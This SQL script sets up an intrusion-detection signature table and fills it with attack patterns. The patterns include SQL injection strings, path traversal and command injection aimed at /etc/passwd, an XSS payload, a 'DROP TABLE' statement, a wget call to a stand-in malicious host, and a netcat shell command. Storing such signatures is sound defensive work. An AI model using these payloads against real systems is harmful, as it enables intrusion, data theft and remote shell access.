-- features.sql
CREATE DATABASE IDSFeatures;
USE IDSFeatures;

CREATE TABLE Features (
    FeatureID INT PRIMARY KEY AUTO_INCREMENT,
    FeatureName VARCHAR(255) NOT NULL,
    FeaturePattern TEXT NOT NULL,
    PatternType VARCHAR(100),
    CreatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UpdatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);
SHOW TABLES;

INSERT INTO Features (FeatureName, FeaturePattern, PatternType)
VALUES ('SQL Injection', 'SELECT * FROM users WHERE username = '' OR ''1''=''1', 'SQL Injection Type');

UPDATE Features
SET FeaturePattern = 'DROP TABLE students;',
    PatternType = 'Malicious SQL'
WHERE FeatureID = 1;
-- SQL INSERT Statements for Features table
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('whois_raw.cgi', 'whois_raw.cgi?fqdn=%0acat%20/etc/passwd', 'Web');
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('faxsurvey', 'faxsurvey?/bin/cat%20/etc/passwd', 'Web');
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('File Inclusion', '../../../../etc/passwd', 'Web');
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('Remote Command Execution', ';wget http://malicious.com', 'Web');
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('SQL Injection', 'UNION SELECT', 'Database');
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('SQL Injection', 'SELECT * FROM users WHERE username = ''admin'' --', 'Database');

INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('XSS', '<img src=x onerror=alert(''XSS'')>', 'Web');
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('Local File Disclosure', 'file:///etc/passwd', 'Web');
INSERT INTO Features (FeatureName, FeaturePattern, PatternType) VALUES ('Command Injection', '; nc -e /bin/sh', 'Web');
-- More entries follow...

-- Note:
-- The PatternType column values like 'Web', 'Database', etc., are just placeholders. You can modify them according to the actual types or categories these patterns belong to.

SELECT * FROM Features;
